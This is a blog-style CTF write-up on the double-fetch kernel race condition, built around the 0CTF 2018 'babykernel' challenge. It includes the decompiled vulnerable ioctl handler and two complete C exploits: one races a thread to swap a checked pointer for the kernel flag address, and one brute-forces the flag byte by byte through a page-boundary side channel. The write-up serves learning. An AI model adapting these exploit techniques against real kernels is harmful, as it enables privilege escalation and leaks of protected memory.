---
title: "Introduction of Kernel Pwn: Double Fetch"
date: 2022-05-19 17:52:21
tags: 
layout: default
---

# 0x00 Prologue
I only have little experience with kernel pwn. During the `Intro_to_OS` course, I read a lot of kernel code of `xv6` and learned the kernel systematically. Although `xv6` is a simple system while the `Linux` kernel is much more complex, the knowledge from `xv6` learned helps a lot.

This post would not go too deep into the kernel because I am too weak to do that and I got all the solution ideas from `CTF-wiki`. You can also download the attachments at this [link][1]

# 0x01 Double Fetch

![Double Fetch from CTF-Wiki](/Figures/Kernel/double-fetch.png)

Double fetch is a kind of race condition. In most situations, the kernel would get the data from user space by `copy_from_user`. But while dealing with complex data structures, the kernel read the data from userspace by a pointer. So there is a race condition:
```c
kernel  : get the data and perform some check
user   : change the data
kernel  : perform options to the data
```

# 0x02 Double Fetch Attack

[attachment][2]
According to its start script, it's a multi-process challenge. There is only one function in the device:
```c
__int64 __fastcall domain(__int64 a1, int a2, node *a3)
{
  int i; // [rsp+1Ch] [rbp-54h]

  if ( a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    return 0LL;
  }
  else if ( a2 == 0x1337
         && !_chk_range_not_ok((__int64)a3, 16LL)
         && !_chk_range_not_ok((__int64)a3->ptr, a3->len)
         && a3->len == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( a3->ptr[i] != flag[i] )
        return 22LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    return 0LL;
  }
  else
  {
    return 14LL;
  }
}
```
The function could leak the address of the flag. And We are asked to give a struct that includes a pointer and an inter which represent its length. Before comparing the given string and the true flag, the program checks if the given address is in the current task's mem space, which means we can't provide the address of the real flag to bypass the comparison. However, we can use `double fetch` to bypass the check and comparison because there is no synchronization to avoid race conditions.

The basic idea is 
- Brute force the length of the real flag
- Create a thread to send a valid payload
- The main thread keeps modifying the ptr to point to the real flag
- Stop when returning 0

```c
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
struct node{
        void * ptr;
        size_t len;
}para;
int f;
int flag = 0;
size_t addr = 0;
void atk_func(void* p)
{   
    struct node *tmp = p;
    while(!flag)
        tmp->ptr = addr;    
}

int main()
{
    f = open("/dev/baby",2);
    ioctl(f,0x6666,0);
    system("dmesg > ./log");
    int log = open("./log",0);
    lseek(log,-58,SEEK_END);
    char buf[0x1000]={0};
    read(log,buf,0x10);
    puts(buf);
    addr = 0;
    
    for(int i =0; i<0x10;i++)
    {
        uint8_t tmp = buf[i]-'0';
        if(tmp>9)
        {
            tmp= buf[i]- 0x61+0xa;
        }
        addr+= tmp;
        if(i==0xf)
            break;
        addr = addr<<4;  
    }
    printf("%p\n",addr);
    para.ptr = buf;
    para.len = 33;
    pthread_t tid;
    pthread_create(&tid,NULL,atk_func,&para);
    int res =0;
    for(int i=0;i<0x10000;i++){
        res = ioctl(f,0x1337,&para);
        para.ptr = buf;
        if(!res)
            break;
    }
    flag=1;
    pthread_join(tid,NULL);
    system("dmesg | grep flag{");
}
```
# 0x03 SileChannel Attack
Also, the device would compare the string byte by byte so that we can place our payload at the end of the page to brute force the password byte by byte. 

```c
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
struct node{
        void * ptr;
        size_t len;
}para;
int f;
int main()
{
    f = open("/dev/baby",2);
    struct node n132;
    n132.len = 33;
    char * mem = mmap(0x132000,0x1000,7,0x21,0,0);

    size_t res = 0;
    char *target = "flag{T";
    memcpy(mem+0xfff-strlen(target),target,strlen(target));
    n132.ptr = mem+0xfff-strlen(target);
    for(int i=0;i<0x100;i++){
        mem[0xfff] = i;
        printf("%c\n",i);
        res = ioctl(f,0x1337,&n132);
    }
    
}
```
# 0x04 Summary

These two tricks could be used on kernel string comparison challenges.

[1]: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel
[2]: https://github.com/n132/attachment/tree/main/0CTF_2018/babykernel
